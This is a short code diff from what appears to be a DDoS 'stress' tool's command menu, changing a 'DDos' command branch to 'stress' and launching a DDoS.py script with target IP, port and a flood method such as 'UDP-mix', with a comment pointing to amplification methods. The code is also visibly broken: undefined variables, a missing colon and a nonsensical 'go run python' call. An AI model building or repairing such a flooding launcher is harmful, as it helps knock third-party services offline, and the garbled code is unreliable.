@@ -401,15 +401,15 @@ def main():
                 print('      [3] HTTP')
                 print('Example: stress 1.1.1.1 80 3 1250 60 5')
                 
-                 elif "DDos" in cnc
-                    try:
-                    	ip = cnc.split()[1]
-                        domain = cnc.split()[2]
-                        time = cnc.split()[3]
-                        os.system(f'go run python DDoS.py {ip} {port} {method}')
-                        except IndexError
-                            print('Usage: DDoS.py <ip> <port> <method>')
-                            print('Example: DDos.py 1.1.1.1 7777 UDP-mix')
+        elif "stress" in cnc:
+            try:
+                ip = cnc.split()[1]
+                domain = cnc.split()[2]
+                time = cnc.split()[3]
+                os.system(f'go run python DDoS.py {ip} {port} {method}')
+            except IndexError
+                print('Usage: DDoS.py <ip> <port> <method>')
+                print('Example: DDos.py 1.1.1.1 7777 UDP-mix')
                         
                            
 # AMP/GAMES METHODS
